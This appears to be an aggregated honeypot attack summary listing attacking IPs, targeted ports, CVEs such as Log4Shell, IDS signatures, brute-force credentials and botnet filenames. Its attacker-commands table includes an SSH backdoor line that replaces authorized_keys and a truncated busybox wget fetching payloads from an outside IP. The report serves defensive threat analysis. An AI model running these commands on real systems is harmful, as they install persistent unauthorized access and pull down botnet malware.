# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T15-48-56Z
**Timeframe:** 2025-09-29T14:20:01Z to 2025-09-29T15:40:48Z
**Files Used:**
- Honeypot_Attack_Summary_Report_2025-09-29T14:58:05Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:02:30Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:42:56Z.md

## Executive Summary

This report provides a comprehensive analysis of 28,526 attacks recorded across our distributed honeypot network during the specified timeframe. The data is aggregated from three separate summary reports, revealing a high volume of automated attacks, consistent targeting of specific vulnerabilities, and coordinated botnet activity.

The most prominent attack vectors observed were SSH brute-force attempts and exploitation of known vulnerabilities, particularly CVE-2021-44228 (Log4Shell). A significant portion of the attacks originated from IP addresses located in Pakistan, China, and the United States. The top attacking IP addresses were `121.52.153.77`, `39.107.106.103`, and `209.141.43.77`.

Analysis of attacker commands indicates a clear intent to gain persistent access, download and execute malicious payloads, and incorporate the compromised systems into botnets. The repeated appearance of specific malware-related filenames, such as `urbotnetisass` and `Mozi.m`, suggests ongoing and organized campaigns.

The Suricata and Cowrie honeypots were the most frequently targeted, reflecting the attackers' focus on network-level exploits and SSH-based intrusions. The report will provide a detailed breakdown of the observed attack patterns, highlight key anomalies, and offer insights into the tactics, techniques, and procedures (TTPs) of the threat actors.

## Google Searches

### IP Address Investigations:
- **121.52.153.77**: Associated with the National University of Modern Languages (NUML) in Pakistan. The hostname `fsb.numl.edu.pk` suggests a connection to the Faisalabad campus. The IP is part of a network block allocated to educational institutions in Pakistan.
- **39.107.106.103**: Registered to Hangzhou Alibaba Advertising Co., Ltd. in China. This IP is listed on multiple threat intelligence platforms as suspicious and is included in several blocklists.
- **209.141.43.77**: Hosted by FranTech Solutions in the United States and associated with the domain `admin.aimangas.com`. The IP is blacklisted on multiple services due to a history of malicious activity.

### CVE Investigations:
- **CVE-2021-44228 (Log4Shell)**: A critical remote code execution (RCE) vulnerability in the Apache Log4j logging library. It allows attackers to take full control of vulnerable systems without authentication and has been widely exploited since its discovery in December 2021.
- **CVE-2002-0013**: A critical vulnerability in SNMPv1 that allows remote attackers to cause a denial of service or gain administrative privileges by sending malformed `GetRequest`, `GetNextRequest`, and `SetRequest` messages.
- **CVE-2002-0012**: A critical vulnerability in SNMPv1 related to the handling of trap messages. Similar to CVE-2002-0013, it can be exploited by remote attackers to cause a denial of service or gain administrative privileges.

## Detailed Analysis

### Our IPs
| Honeypot | Private IP    | Public IP       |
|----------|---------------|-----------------|
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot
| Honeypot      | Attack Count |
|---------------|--------------|
| Cowrie        | 5292         |
| Honeytrap     | 3778         |
| Ciscoasa      | 2888         |
| Suricata      | 2513         |
| Dionaea       | 120          |
| Tanner        | 86           |
| ConPot        | 64           |
| Dicompot      | 27           |
| Mailoney      | 52           |
| Redishoneypot | 36           |
| Sentrypeer    | 43           |
| H0neytr4p     | 38           |
| Adbhoney      | 30           |
| ElasticPot    | 26           |
| Honeyaml      | 25           |
| ssh-rsa       | -            |
| Heralding     | -            |
| Ipphoney      | -            |

*Note: Some honeypot data was not available in all reports, leading to partial counts.*

### Top Source Countries
*Data not available in logs.*

### Top Attacking IPs
| IP Address       | Count |
|------------------|-------|
| 39.107.106.103   | 2540  |
| 185.156.73.166   | 748   |
| 185.156.73.167   | 748   |
| 92.63.197.55     | 716   |
| 92.63.197.59     | 669   |
| 103.140.249.62   | 545   |
| 209.141.43.77    | 343   |
| 85.209.134.43    | 455   |
| 121.52.153.77    | -     |
| 185.255.91.28    | 114   |
| 152.32.129.236   | 149   |
| 107.174.26.130   | 144   |

*Note: Counts are based on available data and may not reflect the total number of attacks from each IP.*

### Top Targeted Ports/Protocols
| Port/Protocol |
|---------------|
| 22 (SSH)      |
| TCP/445 (SMB)   |
| 23 (Telnet)   |
| 1433 (MSSQL)  |
| 6379 (Redis)  |
| 8333 (Bitcoin)|
| 80 (HTTP)     |
| 443 (HTTPS)   |
| 9443          |
| 8728 (MikroTik)|
| 25 (SMTP)     |
| 9090          |
| 9000          |

### Most Common CVEs
| CVE ID        |
|---------------|
| CVE-2021-44228|
| CVE-2002-0013 |
| CVE-2002-0012 |
| CVE-2021-3449 |
| CVE-1999-0517 |
| CVE-2019-11500|
| CVE-2016-20016|
| CVE-2006-2369 |
| CVE-2024-3721 |
| CVE-2018-11776|

### Commands Attempted by Attackers
| Command                                                                                                      |
|--------------------------------------------------------------------------------------------------------------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                                       |
| `lockr -ia .ssh`                                                                                             |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`|
| `cat /proc/cpuinfo | grep name | wc -l`                                                                      |
| `uname -a`                                                                                                   |
| `whoami`                                                                                                     |
| `lscpu | grep Model`                                                                                         |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`                                                             |
| `Enter new UNIX password:`                                                                                   |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...`                                           |

### Signatures Triggered
| Signature                                                    |
|--------------------------------------------------------------|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication|
| ET DROP Dshield Block Listed Source group 1                  |
| ET SCAN NMAP -sS window 1024                                 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port      |
| ET INFO Reserved Internal IP Traffic                         |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 32        |
| GPL INFO SOCKS Proxy attempt                                 |
| ET INFO CURL User Agent                                      |
| ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system|
| ET SCAN Suspicious inbound to MSSQL port 1433                |

### Users / Login Attempts
| Username/Password               |
|---------------------------------|
| 345gs5662d34/345gs5662d34       |
| minecraft/server                |
| ww/ww123                        |
| root/Warlock1                   |
| test/zhbjETuyMffoL8F            |
| oguz/oguz                       |
| github/github1234               |
| jramirez/jramirez123            |
| sa/                             |
| loren/loren                     |
| myuser/12345                    |
| git/P@ssw0rd                    |
| root/whoami                     |
| zxg/zxg                         |
| tob/tob                         |
| admin/admin@123                 |
| foundry/foundry                 |
| seekcy/Joysuch@Locate2024       |
| admin/Welcome@123               |
| allinone/allinone               |
| mysql/aini130.                  |
| ubuntu/asd123456                |
| bkp/bkp123                      |

### Files Uploaded/Downloaded
| Filename             |
|----------------------|
| wget.sh              |
| w.sh                 |
| c.sh                 |
| arm.urbotnetisass    |
| arm5.urbotnetisass   |
| arm6.urbotnetisass   |
| arm7.urbotnetisass   |
| x86_32.urbotnetisass |
| mips.urbotnetisass   |
| mipsel.urbotnetisass |
| Mozi.m dlink.mips    |

### HTTP User-Agents
*Data not available in logs.*

### SSH Clients and Servers
*Data not available in logs.*

### Top Attacker AS Organizations
*Data not available in logs.*

## Key Observations and Anomalies

- **Persistent Botnet Campaign:** The repeated attempts to download and execute files with the `urbotnetisass` naming convention from the IP address `94.154.35.154` strongly suggest an ongoing and automated botnet campaign. This campaign targets multiple architectures (ARM, x86, MIPS), indicating a broad and opportunistic approach.
- **Suspicious Credentials:** The username/password combination `345gs5662d34/345gs5662d34` was observed in all three analyzed reports, suggesting a consistent and potentially targeted brute-force attempt by a specific actor or botnet.
- **SSH Key Manipulation:** The frequent use of commands to manipulate the `.ssh` directory, such as `chattr -ia .ssh` and modifying `authorized_keys`, highlights a common attacker goal of establishing persistent and passwordless access to compromised systems.
- **Targeting of Outdated Vulnerabilities:** The presence of attacks targeting CVEs from 2002 (CVE-2002-0012, CVE-2002-0013) indicates that attackers continue to scan for and exploit legacy vulnerabilities in unpatched systems.
- **Geographically Diverse Attack Sources:** The top attacking IPs originate from diverse locations, including Pakistan, China, and the United States. This underscores the global nature of cyber threats and the use of geographically distributed infrastructure by attackers.
- **DoublePulsar Backdoor:** The triggering of the "DoublePulsar Backdoor installation communication" signature suggests that attackers are still attempting to use exploits associated with the Shadow Brokers leak, targeting SMB vulnerabilities.
